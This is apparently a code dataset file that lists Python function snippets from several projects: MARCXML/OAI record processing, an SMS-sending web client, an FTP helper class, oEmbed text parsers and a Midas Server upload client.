            "def _warning(code):\n    \"\"\"\n    Return a warning message of code 'code'.\n\n    If code = (cd, str) it returns the warning message of code 'cd' and appends\n    str at the end\n    \"\"\"\n    if isinstance(code, str):\n        return code\n\n    message = ''\n    if isinstance(code, tuple):\n        if isinstance(code[0], str):\n            message = code[1]\n            code = code[0]\n    return CFG_BIBRECORD_WARNING_MSGS.get(code, '') + message"
        ],
        [
            "def _compare_lists(list1, list2, custom_cmp):\n    \"\"\"Compare twolists using given comparing function.\n\n    :param list1: first list to compare\n    :param list2: second list to compare\n    :param custom_cmp: a function taking two arguments (element of\n        list 1, element of list 2) and\n    :return: True or False depending if the values are the same\n    \"\"\"\n    if len(list1) != len(list2):\n        return False\n    for element1, element2 in zip(list1, list2):\n        if not custom_cmp(element1, element2):\n            return False\n    return True"
        ],
        [
            "def parse(self, path_to_xml=None):\n        \"\"\"Parse an XML document and clean any namespaces.\"\"\"\n        if not path_to_xml:\n            if not self.path:\n                self.logger.error(\"No path defined!\")\n                return\n            path_to_xml = self.path\n        root = self._clean_xml(path_to_xml)\n\n        # See first of this XML is clean or OAI request\n        if root.tag.lower() == 'collection':\n            tree = ET.ElementTree(root)\n            self.records = element_tree_collection_to_records(tree)\n        elif root.tag.lower() == 'record':\n            new_root = ET.Element('collection')\n            new_root.append(root)\n            tree = ET.ElementTree(new_root)\n            self.records = element_tree_collection_to_records(tree)\n        else:\n            # We have an OAI request\n            header_subs = get_request_subfields(root)\n            records = root.find('ListRecords')\n            if records is None:\n                records = root.find('GetRecord')\n            if records is None:\n                raise ValueError(\"Cannot find ListRecords or GetRecord!\")\n\n            tree = ET.ElementTree(records)\n            for record, is_deleted in element_tree_oai_records(tree, header_subs):\n                if is_deleted:\n                    # It was OAI deleted. Create special record\n                    self.deleted_records.append(\n                        self.create_deleted_record(record)\n                    )\n                else:\n                    self.records.append(record)"
        ],
        [
            "def _clean_xml(self, path_to_xml):\n        \"\"\"Clean MARCXML harvested from OAI.\n\n        Allows the xml to be used with BibUpload or BibRecord.\n\n        :param xml: either XML as a string or path to an XML file\n\n        :return: ElementTree of clean data\n        \"\"\"\n        try:\n            if os.path.isfile(path_to_xml):\n                tree = ET.parse(path_to_xml)\n                root = tree.getroot()\n            else:\n                root = ET.fromstring(path_to_xml)\n        except Exception, e:\n            self.logger.error(\"Could not read OAI XML, aborting filter!\")\n            raise e\n        strip_xml_namespace(root)\n        return root"
        ],
        [
            "def create_deleted_record(self, record):\n        \"\"\"Generate the record deletion if deleted form OAI-PMH.\"\"\"\n        identifier = record_get_field_value(record,\n                                            tag=\"037\",\n                                            code=\"a\")\n        recid = identifier.split(\":\")[-1]\n        try:\n            source = identifier.split(\":\")[1]\n        except IndexError:\n            source = \"Unknown\"\n        record_add_field(record, \"035\",\n                         subfields=[(\"9\", source), (\"a\", recid)])\n        record_add_field(record, \"980\",\n                         subfields=[(\"c\", \"DELETED\")])\n        return record"
        ],
        [
            "def _login(self, session, get_request=False):\n        \"\"\"Return a session for yesss.at.\"\"\"\n        req = session.post(self._login_url, data=self._logindata)\n        if _LOGIN_ERROR_STRING in req.text or \\\n                req.status_code == 403 or \\\n                req.url == _LOGIN_URL:\n            err_mess = \"YesssSMS: login failed, username or password wrong\"\n\n            if _LOGIN_LOCKED_MESS in req.text:\n                err_mess += \", page says: \" + _LOGIN_LOCKED_MESS_ENG\n                self._suspended = True\n                raise self.AccountSuspendedError(err_mess)\n            raise self.LoginError(err_mess)\n\n        self._suspended = False  # login worked\n\n        return (session, req) if get_request else session"
        ],
        [
            "def login_data_valid(self):\n        \"\"\"Check for working login data.\"\"\"\n        login_working = False\n        try:\n            with self._login(requests.Session()) as sess:\n                sess.get(self._logout_url)\n        except self.LoginError:\n            pass\n        else:\n            login_working = True\n        return login_working"
        ],
        [
            "def send(self, recipient, message):\n        \"\"\"Send an SMS.\"\"\"\n        if self._logindata['login_rufnummer'] is None or \\\n                self._logindata['login_passwort'] is None:\n            err_mess = \"YesssSMS: Login data required\"\n            raise self.LoginError(err_mess)\n        if not recipient:\n            raise self.NoRecipientError(\"YesssSMS: recipient number missing\")\n        if not isinstance(recipient, str):\n            raise ValueError(\"YesssSMS: str expected as recipient number\")\n        if not message:\n            raise self.EmptyMessageError(\"YesssSMS: message is empty\")\n\n        with self._login(requests.Session()) as sess:\n\n            sms_data = {'to_nummer': recipient, 'nachricht': message}\n            req = sess.post(self._websms_url, data=sms_data)\n\n            if not (req.status_code == 200 or req.status_code == 302):\n                raise self.SMSSendingError(\"YesssSMS: error sending SMS\")\n\n            if _UNSUPPORTED_CHARS_STRING in req.text:\n                raise self.UnsupportedCharsError(\n                    \"YesssSMS: message contains unsupported character(s)\")\n\n            if _SMS_SENDING_SUCCESSFUL_STRING not in req.text:\n                raise self.SMSSendingError(\"YesssSMS: error sending SMS\")\n\n            sess.get(self._logout_url)"
        ],
        [
            "def get_date(self, filename):\n        \"\"\"Return the date of the article in file.\"\"\"\n        try:\n            self.document = parse(filename)\n            return self._get_date()\n        except DateNotFoundException:\n            print(\"Date problem found in {0}\".format(filename))\n            return datetime.datetime.strftime(datetime.datetime.now(),\n                                              \"%Y-%m-%d\")"
        ],
        [
            "def get_collection(self, journal):\n        \"\"\"Return this articles' collection.\"\"\"\n        conference = ''\n        for tag in self.document.getElementsByTagName('conference'):\n            conference = xml_to_text(tag)\n        if conference or journal == \"International Journal of Modern Physics: Conference Series\":\n            return [('a', 'HEP'), ('a', 'ConferencePaper')]\n        elif self._get_article_type() == \"review-article\":\n            return [('a', 'HEP'), ('a', 'Review')]\n        else:\n            return [('a', 'HEP'), ('a', 'Published')]"
        ],
        [
            "def _attach_fulltext(self, rec, doi):\n        \"\"\"Attach fulltext FFT.\"\"\"\n        url = os.path.join(self.url_prefix, doi)\n        record_add_field(rec, 'FFT',\n                         subfields=[('a', url),\n                                    ('t', 'INSPIRE-PUBLIC'),\n                                    ('d', 'Fulltext')])"
        ],
        [
            "def convert_all(cls, records):\n        \"\"\"Convert the list of bibrecs into one MARCXML.\n\n        >>> from harvestingkit.bibrecord import BibRecordPackage\n        >>> from harvestingkit.inspire_cds_package import Inspire2CDS\n        >>> bibrecs = BibRecordPackage(\"inspire.xml\")\n        >>> bibrecs.parse()\n        >>> xml = Inspire2CDS.convert_all(bibrecs.get_records())\n\n        :param records: list of BibRecord dicts\n        :type records: list\n\n        :returns: MARCXML as string\n        \"\"\"\n        out = [\"<collection>\"]\n        for rec in records:\n            conversion = cls(rec)\n            out.append(conversion.convert())\n        out.append(\"</collection>\")\n        return \"\\n\".join(out)"
        ],
        [
            "def from_source(cls, source):\n        \"\"\"Yield single conversion objects from a MARCXML file or string.\n\n        >>> from harvestingkit.inspire_cds_package import Inspire2CDS\n        >>> for record in Inspire2CDS.from_source(\"inspire.xml\"):\n        >>>     xml = record.convert()\n\n        \"\"\"\n        bibrecs = BibRecordPackage(source)\n        bibrecs.parse()\n        for bibrec in bibrecs.get_records():\n            yield cls(bibrec)"
        ],
        [
            "def get_config_item(cls, key, kb_name, allow_substring=True):\n        \"\"\"Return the opposite mapping by searching the imported KB.\"\"\"\n        config_dict = cls.kbs.get(kb_name, None)\n        if config_dict:\n            if key in config_dict:\n                return config_dict[key]\n            elif allow_substring:\n                res = [v for k, v in config_dict.items() if key in k]\n                if res:\n                    return res[0]\n        return key"
        ],
        [
            "def load_config(from_key, to_key):\n        \"\"\"Load configuration from config.\n\n        Meant to run only once per system process as\n        class variable in subclasses.\"\"\"\n        from .mappings import mappings\n        kbs = {}\n        for key, values in mappings['config'].iteritems():\n            parse_dict = {}\n            for mapping in values:\n                # {'inspire': 'Norwegian', 'cds': 'nno'}\n                # -> {\"Norwegian\": \"nno\"}\n                parse_dict[mapping[from_key]] = mapping[to_key]\n            kbs[key] = parse_dict\n        return kbs"
        ],
        [
            "def match(self, query=None, **kwargs):\n        \"\"\"Try to match the current record to the database.\"\"\"\n        from invenio.search_engine import perform_request_search\n        if not query:\n            # We use default setup\n            recid = self.record[\"001\"][0][3]\n            return perform_request_search(p=\"035:%s\" % (recid,),\n                                          of=\"id\")\n        else:\n            if \"recid\" not in kwargs:\n                kwargs[\"recid\"] = self.record[\"001\"][0][3]\n            return perform_request_search(p=query % kwargs,\n                                          of=\"id\")"
        ],
        [
            "def keep_only_fields(self):\n        \"\"\"Keep only fields listed in field_list.\"\"\"\n        for tag in self.record.keys():\n            if tag not in self.fields_list:\n                record_delete_fields(self.record, tag)"
        ],
        [
            "def strip_fields(self):\n        \"\"\"Clear any fields listed in field_list.\"\"\"\n        for tag in self.record.keys():\n            if tag in self.fields_list:\n                record_delete_fields(self.record, tag)"
        ],
        [
            "def add_systemnumber(self, source, recid=None):\n        \"\"\"Add 035 number from 001 recid with given source.\"\"\"\n        if not recid:\n            recid = self.get_recid()\n        if not self.hidden and recid:\n            record_add_field(\n                self.record,\n                tag='035',\n                subfields=[('9', source), ('a', recid)]\n            )"
        ],
        [
            "def add_control_number(self, tag, value):\n        \"\"\"Add a control-number 00x for given tag with value.\"\"\"\n        record_add_field(self.record,\n                         tag,\n                         controlfield_value=value)"
        ],
        [
            "def update_subject_categories(self, primary, secondary, kb):\n        \"\"\"650 Translate Categories.\"\"\"\n        category_fields = record_get_field_instances(self.record,\n                                                     tag='650',\n                                                     ind1='1',\n                                                     ind2='7')\n        record_delete_fields(self.record, \"650\")\n        for field in category_fields:\n            for idx, (key, value) in enumerate(field[0]):\n                if key == 'a':\n                    new_value = self.get_config_item(value, kb)\n                    if new_value != value:\n                        new_subs = [('2', secondary), ('a', new_value)]\n                    else:\n                        new_subs = [('2', primary), ('a', value)]\n                    record_add_field(self.record, \"650\", ind1=\"1\", ind2=\"7\",\n                                     subfields=new_subs)\n                    break"
        ],
        [
            "def connect(self):\n        \"\"\" Connects and logins to the server. \"\"\"\n        self._ftp.connect()\n        self._ftp.login(user=self._username, passwd=self._passwd)"
        ],
        [
            "def download(self, source_file, target_folder=''):\n        \"\"\" Downloads a file from the FTP server to target folder\n\n        :param source_file: the absolute path for the file on the server\n                   it can be the one of the files coming from\n                   FtpHandler.dir().\n        :type source_file: string\n        :param target_folder: relative or absolute path of the\n                              destination folder default is the\n                              working directory.\n        :type target_folder: string\n        \"\"\"\n        current_folder = self._ftp.pwd()\n\n        if not target_folder.startswith('/'):  # relative path\n            target_folder = join(getcwd(), target_folder)\n\n        folder = os.path.dirname(source_file)\n        self.cd(folder)\n\n        if folder.startswith(\"/\"):\n            folder = folder[1:]\n\n        destination_folder = join(target_folder, folder)\n        if not os.path.exists(destination_folder):\n            print(\"Creating folder\", destination_folder)\n            os.makedirs(destination_folder)\n\n        source_file = os.path.basename(source_file)\n        destination = join(destination_folder, source_file)\n        try:\n            with open(destination, 'wb') as result:\n                self._ftp.retrbinary('RETR %s' % (source_file,),\n                                     result.write)\n        except error_perm as e:  # source_file is a folder\n            print(e)\n            remove(join(target_folder, source_file))\n            raise\n        self._ftp.cwd(current_folder)"
        ],
        [
            "def cd(self, folder):\n        \"\"\" Changes the working directory on the server.\n\n        :param folder: the desired directory.\n        :type folder: string\n        \"\"\"\n        if folder.startswith('/'):\n            self._ftp.cwd(folder)\n        else:\n            for subfolder in folder.split('/'):\n                if subfolder:\n                    self._ftp.cwd(subfolder)"
        ],
        [
            "def ls(self, folder=''):\n        \"\"\" Lists the files and folders of a specific directory\n        default is the current working directory.\n\n        :param folder: the folder to be listed.\n        :type folder: string\n\n        :returns: a tuple with the list of files in the folder\n                  and the list of subfolders in the folder.\n        \"\"\"\n        current_folder = self._ftp.pwd()\n        self.cd(folder)\n        contents = []\n        self._ftp.retrlines('LIST', lambda a: contents.append(a))\n        files = filter(lambda a: a.split()[0].startswith('-'), contents)\n        folders = filter(lambda a: a.split()[0].startswith('d'), contents)\n        files = map(lambda a: ' '.join(a.split()[8:]), files)\n        folders = map(lambda a: ' '.join(a.split()[8:]), folders)\n        self._ftp.cwd(current_folder)\n        return files, folders"
        ],
        [
            "def mkdir(self, folder):\n        \"\"\" Creates a folder in the server\n\n        :param folder: the folder to be created.\n        :type folder: string\n        \"\"\"\n        current_folder = self._ftp.pwd()\n        #creates the necessary folders on\n        #the server if they don't exist\n        folders = folder.split('/')\n        for fld in folders:\n            try:\n                self.cd(fld)\n            except error_perm:  # folder does not exist\n                self._ftp.mkd(fld)\n                self.cd(fld)\n        self.cd(current_folder)"
        ],
        [
            "def rm(self, filename):\n        \"\"\" Delete a file from the server.\n\n        :param filename: the file to be deleted.\n        :type filename: string\n        \"\"\"\n        try:\n            self._ftp.delete(filename)\n        except error_perm:  # target is either a directory\n                            # either it does not exist\n            try:\n                current_folder = self._ftp.pwd()\n                self.cd(filename)\n            except error_perm:\n                print('550 Delete operation failed %s '\n                      'does not exist!' % (filename,))\n            else:\n                self.cd(current_folder)\n                print('550 Delete operation failed %s '\n                      'is a folder. Use rmdir function '\n                      'to delete it.' % (filename,))"
        ],
        [
            "def rmdir(self, foldername):\n        \"\"\" Delete a folder from the server.\n\n        :param foldername: the folder to be deleted.\n        :type foldername: string\n        \"\"\"\n        current_folder = self._ftp.pwd()\n        try:\n            self.cd(foldername)\n        except error_perm:\n            print('550 Delete operation failed folder %s '\n                  'does not exist!' % (foldername,))\n        else:\n            self.cd(current_folder)\n            try:\n                self._ftp.rmd(foldername)\n            except error_perm:  # folder not empty\n                self.cd(foldername)\n                contents = self.ls()\n                #delete the files\n                map(self._ftp.delete, contents[0])\n                #delete the subfolders\n                map(self.rmdir, contents[1])\n                self.cd(current_folder)\n                self._ftp.rmd(foldername)"
        ],
        [
            "def get_filesize(self, filename):\n        \"\"\" Returns the filesize of a file\n\n        :param filename: the full path to the file on the server.\n        :type filename: string\n\n        :returns: string representation of the filesize.\n        \"\"\"\n        result = []\n\n        def dir_callback(val):\n            result.append(val.split()[4])\n\n        self._ftp.dir(filename, dir_callback)\n        return result[0]"
        ],
        [
            "def upload(self, filename, location=''):\n        \"\"\" Uploads a file on the server to the desired location\n\n        :param filename: the name of the file to be uploaded.\n        :type filename: string\n        :param location: the directory in which the file will\n                         be stored.\n        :type location: string\n        \"\"\"\n        current_folder = self._ftp.pwd()\n        self.mkdir(location)\n        self.cd(location)\n        fl = open(filename, 'rb')\n        filename = filename.split('/')[-1]\n        self._ftp.storbinary('STOR %s' % filename, fl)\n        fl.close()\n        self.cd(current_folder)"
        ],
        [
            "def parse_data(self, text, maxwidth, maxheight, template_dir, context,\n                   urlize_all_links):\n        \"\"\"\n        Parses a block of text indiscriminately\n        \"\"\"\n        # create a dictionary of user urls -> rendered responses\n        replacements = {}\n        user_urls = set(re.findall(URL_RE, text))\n        \n        for user_url in user_urls:\n            try:\n                resource = oembed.site.embed(user_url, maxwidth=maxwidth, maxheight=maxheight)\n            except OEmbedException:\n                if urlize_all_links:\n                    replacements[user_url] = '<a href=\"%(LINK)s\">%(LINK)s</a>' % {'LINK': user_url}\n            else:\n                context['minwidth'] = min(maxwidth, resource.width)\n                context['minheight'] = min(maxheight, resource.height)\n                \n                replacement = self.render_oembed(\n                    resource, \n                    user_url, \n                    template_dir=template_dir, \n                    context=context\n                )\n                replacements[user_url] = replacement.strip()\n        \n        # go through the text recording URLs that can be replaced\n        # taking note of their start & end indexes\n        user_urls = re.finditer(URL_RE, text)\n        matches = []\n        for match in user_urls:\n            if match.group() in replacements:\n                matches.append([match.start(), match.end(), match.group()])\n        \n        # replace the URLs in order, offsetting the indices each go\n        for indx, (start, end, user_url) in enumerate(matches):\n            replacement = replacements[user_url]\n            difference = len(replacement) - len(user_url)\n            \n            # insert the replacement between two slices of text surrounding the\n            # original url\n            text = text[:start] + replacement + text[end:]\n            \n            # iterate through the rest of the matches offsetting their indices\n            # based on the difference between replacement/original\n            for j in xrange(indx + 1, len(matches)):\n                matches[j][0] += difference\n                matches[j][1] += difference\n        return mark_safe(text)"
        ],
        [
            "def parse_data(self, text, maxwidth, maxheight, template_dir, context, \n                   urlize_all_links):\n        \"\"\"\n        Parses a block of text rendering links that occur on their own line\n        normally but rendering inline links using a special template dir\n        \"\"\"\n        block_parser = TextBlockParser()\n        \n        lines = text.splitlines()\n        parsed = []\n        \n        for line in lines:\n            if STANDALONE_URL_RE.match(line):\n                user_url = line.strip()\n                try:\n                    resource = oembed.site.embed(user_url, maxwidth=maxwidth, maxheight=maxheight)\n                    context['minwidth'] = min(maxwidth, resource.width)\n                    context['minheight'] = min(maxheight, resource.height)\n                except OEmbedException:\n                    if urlize_all_links:\n                        line = '<a href=\"%(LINK)s\">%(LINK)s</a>' % {'LINK': user_url}\n                else:\n                    context['minwidth'] = min(maxwidth, resource.width)\n                    context['minheight'] = min(maxheight, resource.height)\n                    \n                    line = self.render_oembed(\n                        resource, \n                        user_url, \n                        template_dir=template_dir, \n                        context=context)\n            else:\n                line = block_parser.parse(line, maxwidth, maxheight, 'inline',\n                                          context, urlize_all_links)\n            \n            parsed.append(line)\n        \n        return mark_safe('\\n'.join(parsed))"
        ],
        [
            "def login(email=None, password=None, api_key=None, application='Default',\n          url=None, verify_ssl_certificate=True):\n    \"\"\"\n    Do the legwork of logging into the Midas Server instance, storing the API\n    key and token.\n\n    :param email: (optional) Email address to login with. If not set, the\n        console will be prompted.\n    :type email: None | string\n    :param password: (optional) User password to login with. If not set and no\n        'api_key' is set, the console will be prompted.\n    :type password: None | string\n    :param api_key: (optional) API key to login with. If not set, password\n        login with be used.\n    :type api_key: None | string\n    :param application: (optional) Application name to be used with 'api_key'.\n    :type application: string\n    :param url: (optional) URL address of the Midas Server instance to login\n        to. If not set, the console will be prompted.\n    :type url: None | string\n    :param verify_ssl_certificate: (optional) If True, the SSL certificate will\n        be verified\n    :type verify_ssl_certificate: bool\n    :returns: API token.\n    :rtype: string\n    \"\"\"\n    try:\n        input_ = raw_input\n    except NameError:\n        input_ = input\n\n    if url is None:\n        url = input_('Server URL: ')\n    url = url.rstrip('/')\n    if session.communicator is None:\n        session.communicator = Communicator(url)\n    else:\n        session.communicator.url = url\n\n    session.communicator.verify_ssl_certificate = verify_ssl_certificate\n\n    if email is None:\n        email = input_('Email: ')\n    session.email = email\n\n    if api_key is None:\n        if password is None:\n            password = getpass.getpass()\n        session.api_key = session.communicator.get_default_api_key(\n            session.email, password)\n        session.application = 'Default'\n    else:\n        session.api_key = api_key\n        session.application = application\n\n    return renew_token()"
        ],
        [
            "def renew_token():\n    \"\"\"\n    Renew or get a token to use for transactions with the Midas Server\n    instance.\n\n    :returns: API token.\n    :rtype: string\n    \"\"\"\n    session.token = session.communicator.login_with_api_key(\n        session.email, session.api_key, application=session.application)\n    if len(session.token) < 10:  # HACK to check for mfa being enabled\n        one_time_pass = getpass.getpass('One-Time Password: ')\n        session.token = session.communicator.mfa_otp_login(\n            session.token, one_time_pass)\n    return session.token"
        ],
        [
            "def _create_or_reuse_item(local_file, parent_folder_id, reuse_existing=False):\n    \"\"\"\n    Create an item from the local file in the Midas Server folder corresponding\n    to the parent folder id.\n\n    :param local_file: full path to a file on the local file system\n    :type local_file: string\n    :param parent_folder_id: id of parent folder on the Midas Server instance,\n        where the item will be added\n    :type parent_folder_id: int | long\n    :param reuse_existing: (optional) whether to accept an existing item of the\n        same name in the same location, or create a new one instead\n    :type reuse_existing: bool\n    \"\"\"\n    local_item_name = os.path.basename(local_file)\n    item_id = None\n    if reuse_existing:\n        # check by name to see if the item already exists in the folder\n        children = session.communicator.folder_children(\n            session.token, parent_folder_id)\n        items = children['items']\n\n        for item in items:\n            if item['name'] == local_item_name:\n                item_id = item['item_id']\n                break\n\n    if item_id is None:\n        # create the item for the subdir\n        new_item = session.communicator.create_item(\n            session.token, local_item_name, parent_folder_id)\n        item_id = new_item['item_id']\n\n    return item_id"
        ],
        [
            "def _create_or_reuse_folder(local_folder, parent_folder_id,\n                            reuse_existing=False):\n    \"\"\"\n    Create a folder from the local file in the midas folder corresponding to\n    the parent folder id.\n\n    :param local_folder: full path to a directory on the local file system\n    :type local_folder: string\n    :param parent_folder_id: id of parent folder on the Midas Server instance,\n        where the folder will be added\n    :type parent_folder_id: int | long\n    :param reuse_existing: (optional) whether to accept an existing folder of\n       the same name in the same location, or create a new one instead\n    :type reuse_existing: bool\n    \"\"\"\n    local_folder_name = os.path.basename(local_folder)\n    folder_id = None\n    if reuse_existing:\n        # check by name to see if the folder already exists in the folder\n        children = session.communicator.folder_children(\n            session.token, parent_folder_id)\n        folders = children['folders']\n\n        for folder in folders:\n            if folder['name'] == local_folder_name:\n                folder_id = folder['folder_id']\n                break\n\n    if folder_id is None:\n        # create the item for the subdir\n        new_folder = session.communicator.create_folder(session.token,\n                                                        local_folder_name,\n                                                        parent_folder_id)\n        folder_id = new_folder['folder_id']\n\n    return folder_id"
        ],
        [
            "def _streaming_file_md5(file_path):\n    \"\"\"\n    Create and return a hex checksum using the MD5 sum of the passed in file.\n    This will stream the file, rather than load it all into memory.\n\n    :param file_path: full path to the file\n    :type file_path: string\n    :returns: a hex checksum\n    :rtype: string\n    \"\"\"\n    md5 = hashlib.md5()\n    with open(file_path, 'rb') as f:\n        # iter needs an empty byte string for the returned iterator to halt at\n        # EOF\n        for chunk in iter(lambda: f.read(128 * md5.block_size), b''):\n            md5.update(chunk)\n    return md5.hexdigest()"
        ],
        [
            "def _create_bitstream(file_path, local_file, item_id, log_ind=None):\n    \"\"\"\n    Create a bitstream in the given item.\n\n    :param file_path: full path to the local file\n    :type file_path: string\n    :param local_file: name of the local file\n    :type local_file: string\n    :param log_ind: (optional) any additional message to log upon creation of\n        the bitstream\n    :type log_ind: None | string\n    \"\"\"\n    checksum = _streaming_file_md5(file_path)\n    upload_token = session.communicator.generate_upload_token(\n        session.token, item_id, local_file, checksum)\n\n    if upload_token != '':\n        log_trace = 'Uploading bitstream from {0}'.format(file_path)\n        # only need to perform the upload if we haven't uploaded before\n        # in this cae, the upload token would not be empty\n        session.communicator.perform_upload(\n            upload_token, local_file, filepath=file_path, itemid=item_id)\n    else:\n        log_trace = 'Adding a bitstream link in this item to an existing ' \\\n                    'bitstream from {0}'.format(file_path)\n\n    if log_ind is not None:\n        log_trace += log_ind\n    print(log_trace)"
        ],
        [
            "def _upload_as_item(local_file, parent_folder_id, file_path,\n                    reuse_existing=False):\n    \"\"\"\n    Function for doing an upload of a file as an item. This should be a\n    building block for user-level functions.\n\n    :param local_file: name of local file to upload\n    :type local_file: string\n    :param parent_folder_id: id of parent folder on the Midas Server instance,\n        where the item will be added\n    :type parent_folder_id: int | long\n    :param file_path: full path to the file\n    :type file_path: string\n    :param reuse_existing: (optional) whether to accept an existing item of the\n        same name in the same location, or create a new one instead\n    :type reuse_existing: bool\n    \"\"\"\n    current_item_id = _create_or_reuse_item(local_file, parent_folder_id,\n                                            reuse_existing)\n    _create_bitstream(file_path, local_file, current_item_id)\n    for callback in session.item_upload_callbacks:\n        callback(session.communicator, session.token, current_item_id)"
        ],
        [
            "def _create_folder(local_folder, parent_folder_id):\n    \"\"\"\n    Function for creating a remote folder and returning the id. This should be\n    a building block for user-level functions.\n\n    :param local_folder: full path to a local folder\n    :type local_folder: string\n    :param parent_folder_id: id of parent folder on the Midas Server instance,\n        where the new folder will be added\n    :type parent_folder_id: int | long\n    :returns: id of the remote folder that was created\n    :rtype: int | long\n    \"\"\"\n    new_folder = session.communicator.create_folder(\n        session.token, os.path.basename(local_folder), parent_folder_id)\n    return new_folder['folder_id']"
        ],
        [
            "def _upload_folder_recursive(local_folder,\n                             parent_folder_id,\n                             leaf_folders_as_items=False,\n                             reuse_existing=False):\n    \"\"\"\n    Function to recursively upload a folder and all of its descendants.\n\n    :param local_folder: full path to local folder to be uploaded\n    :type local_folder: string\n    :param parent_folder_id: id of parent folder on the Midas Server instance,\n        where the new folder will be added\n    :type parent_folder_id: int | long\n    :param leaf_folders_as_items: (optional) whether leaf folders should have\n        all files uploaded as single items\n    :type leaf_folders_as_items: bool\n    :param reuse_existing: (optional) whether to accept an existing item of the\n        same name in the same location, or create a new one instead\n    :type reuse_existing: bool\n    \"\"\"\n    if leaf_folders_as_items and _has_only_files(local_folder):\n        print('Creating item from {0}'.format(local_folder))\n        _upload_folder_as_item(local_folder, parent_folder_id, reuse_existing)\n        return\n    else:\n        # do not need to check if folder exists, if it does, an attempt to\n        # create it will just return the existing id\n        print('Creating folder from {0}'.format(local_folder))\n        new_folder_id = _create_or_reuse_folder(local_folder, parent_folder_id,\n                                                reuse_existing)\n\n        for entry in sorted(os.listdir(local_folder)):\n            full_entry = os.path.join(local_folder, entry)\n            if os.path.islink(full_entry):\n                # os.walk skips symlinks by default\n                continue\n            elif os.path.isdir(full_entry):\n                _upload_folder_recursive(full_entry,\n                                         new_folder_id,\n                                         leaf_folders_as_items,\n                                         reuse_existing)\n            else:\n                print('Uploading item from {0}'.format(full_entry))\n                _upload_as_item(entry,\n                                new_folder_id,\n                                full_entry,\n                                reuse_existing)"
        ],
        [
            "def _has_only_files(local_folder):\n    \"\"\"\n    Return whether a folder contains only files. This will be False if the\n    folder contains any subdirectories.\n\n    :param local_folder: full path to the local folder\n    :type local_folder: string\n    :returns: True if the folder contains only files\n    :rtype: bool\n    \"\"\"\n    return not any(os.path.isdir(os.path.join(local_folder, entry))\n                   for entry in os.listdir(local_folder))"
        ],
        [
            "def _upload_folder_as_item(local_folder, parent_folder_id,\n                           reuse_existing=False):\n    \"\"\"\n    Upload a folder as a new item. Take a folder and use its base name as the\n    name of a new item. Then, upload its containing files into the new item as\n    bitstreams.\n\n    :param local_folder: The path to the folder to be uploaded\n    :type local_folder: string\n    :param parent_folder_id: The id of the destination folder for the new item.\n    :type parent_folder_id: int | long\n    :param reuse_existing: (optional) whether to accept an existing item of the\n        same name in the same location, or create a new one instead\n    :type reuse_existing: bool\n    \"\"\"\n    item_id = _create_or_reuse_item(local_folder, parent_folder_id,\n                                    reuse_existing)\n\n    subdir_contents = sorted(os.listdir(local_folder))\n    # for each file in the subdir, add it to the item\n    filecount = len(subdir_contents)\n    for (ind, current_file) in enumerate(subdir_contents):\n        file_path = os.path.join(local_folder, current_file)\n        log_ind = '({0} of {1})'.format(ind + 1, filecount)\n        _create_bitstream(file_path, current_file, item_id, log_ind)\n\n    for callback in session.item_upload_callbacks:\n        callback(session.communicator, session.token, item_id)"
        ],
        [
            "def upload(file_pattern, destination='Private', leaf_folders_as_items=False,\n           reuse_existing=False):\n    \"\"\"\n    Upload a pattern of files. This will recursively walk down every tree in\n    the file pattern to create a hierarchy on the server. As of right now, this\n    places the file into the currently logged in user's home directory.\n\n    :param file_pattern: a glob type pattern for files\n    :type file_pattern: string\n    :param destination: (optional) name of the midas destination folder,\n        defaults to Private\n    :type destination: string\n    :param leaf_folders_as_items: (optional) whether leaf folders should have\n        all files uploaded as single items\n    :type leaf_folders_as_items: bool\n    :param reuse_existing: (optional) whether to accept an existing item of the\n        same name in the same location, or create a new one instead\n    :type reuse_existing: bool\n    \"\"\"\n    session.token = verify_credentials()\n\n    # Logic for finding the proper folder to place the files in.\n    parent_folder_id = None\n    user_folders = session.communicator.list_user_folders(session.token)\n    if destination.startswith('/'):\n        parent_folder_id = _find_resource_id_from_path(destination)\n    else:\n        for cur_folder in user_folders:\n            if cur_folder['name'] == destination:\n                parent_folder_id = cur_folder['folder_id']\n    if parent_folder_id is None:\n        print('Unable to locate specified destination. Defaulting to {0}.'\n              .format(user_folders[0]['name']))\n        parent_folder_id = user_folders[0]['folder_id']\n\n    for current_file in glob.iglob(file_pattern):\n        current_file = os.path.normpath(current_file)\n        if os.path.isfile(current_file):\n            print('Uploading item from {0}'.format(current_file))\n            _upload_as_item(os.path.basename(current_file),\n                            parent_folder_id,\n                            current_file,\n                            reuse_existing)\n        else:\n            _upload_folder_recursive(current_file,\n                                     parent_folder_id,\n                                     leaf_folders_as_items,\n                                     reuse_existing)"
        ],
        [
            "def _descend_folder_for_id(parsed_path, folder_id):\n    \"\"\"\n    Descend a path to return a folder id starting from the given folder id.\n\n    :param parsed_path: a list of folders from top to bottom of a hierarchy\n    :type parsed_path: list[string]\n    :param folder_id: The id of the folder from which to start the descent\n    :type folder_id: int | long\n    :returns: The id of the found folder or -1\n    :rtype: int | long\n    \"\"\"\n    if len(parsed_path) == 0:\n        return folder_id\n\n    session.token = verify_credentials()\n\n    base_folder = session.communicator.folder_get(session.token,\n                                                  folder_id)\n    cur_folder_id = -1\n    for path_part in parsed_path:\n        cur_folder_id = base_folder['folder_id']\n        cur_children = session.communicator.folder_children(\n            session.token, cur_folder_id)\n        for inner_folder in cur_children['folders']:\n            if inner_folder['name'] == path_part:\n                base_folder = session.communicator.folder_get(\n                    session.token, inner_folder['folder_id'])\n                cur_folder_id = base_folder['folder_id']\n                break\n        else:\n            return -1\n    return cur_folder_id"
        ],
        [
            "def _search_folder_for_item_or_folder(name, folder_id):\n    \"\"\"\n    Find an item or folder matching the name. A folder will be found first if\n    both are present.\n\n    :param name: The name of the resource\n    :type name: string\n    :param folder_id: The folder to search within\n    :type folder_id: int | long\n    :returns: A tuple indicating whether the resource is an item an the id of\n        said resource. i.e. (True, item_id) or (False, folder_id). Note that in\n        the event that we do not find a result return (False, -1)\n    :rtype: (bool, int | long)\n    \"\"\"\n    session.token = verify_credentials()\n\n    children = session.communicator.folder_children(session.token, folder_id)\n    for folder in children['folders']:\n        if folder['name'] == name:\n            return False, folder['folder_id']  # Found a folder\n    for item in children['items']:\n        if item['name'] == name:\n            return True, item['item_id']  # Found an item\n    return False, -1"
        ],
        [
